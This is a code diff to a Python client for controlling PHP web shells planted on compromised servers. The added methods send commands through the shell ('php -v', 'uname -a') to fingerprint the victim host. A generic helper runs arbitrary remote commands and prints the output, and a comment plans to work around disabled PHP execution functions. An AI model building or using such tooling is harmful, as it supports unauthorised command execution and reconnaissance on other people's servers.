@@ -14,6 +14,8 @@ class WebShell():
     password = "c"
     webroot = ""
     working = False
+    php_version = ""
+    kernel_version = ""
     def __init__(self, url, method, password):
         self.url = url
         self.method = method
@@ -21,10 +23,36 @@ class WebShell():
         self.init(self.url, self.method, self.password)
         if self.working:
             self.webroot = self.get_webroot()[1]
+            self.php_version = self.get_php_version()
+            self.kernel_version = self.get_kernel_version()
             self.print_info()
 
     def get_webroot(self):
         return self.php_code_exec_token("echo $_SERVER['DOCUMENT_ROOT']")
+
+    def get_php_version(self):
+        if self.php_version != "":
+            Log.success(self.php_version)
+            return self.php_version
+        result = self.auto_exec("php -v")
+        if result[0]:
+            Log.success(result[1][0:-1])
+            return result[1][0:-1]
+        else:
+            Log.error("Error occured! %s" % result[1])
+            return ""
+
+    def get_kernel_version(self):
+        if self.kernel_version != "":
+            Log.success(self.kernel_version)
+            return self.kernel_version
+        result = self.auto_exec("uname -a")
+        if result[0]:
+            Log.success(result[1][0:-1])
+            return result[1][0:-1]
+        else:
+            Log.error("Error occured! %s" % result[1])
+            return ""
 
     def print_info(self):
         Log.success("=" * 32)
@@ -32,6 +60,9 @@ class WebShell():
         Log.success("Method : %s" % (self.method))
         Log.success("Password : %s" % (self.password))
         Log.success("Document Root : %s" % (self.webroot))
+        Log.success("=" * 32)
+        Log.success("PHP version : \n\t%s" % (self.php_version))
+        Log.success("Kernel version : \n\t%s" % (self.kernel_version))
         Log.success("=" * 32)
 
     def read_file(self, filepath):
@@ -162,6 +193,14 @@ class WebShell():
         except:
             Log.error("The connection is aborted!")
             return (False, "The connection is aborted!")
+
+    def auto_exec_print(self, command):
+        result = self.auto_exec(command)
+        if result[0]:
+            Log.success("Result : \n%s" % result[1][0:-1])
+        else:
+            Log.error("Error occured! %s" % result[1][0:-1])
+
 
     def auto_exec(self, command):
         # TODO 根据当前环境 , 结合被禁用的函数 , 自动判断使用哪个函数进行命令执行
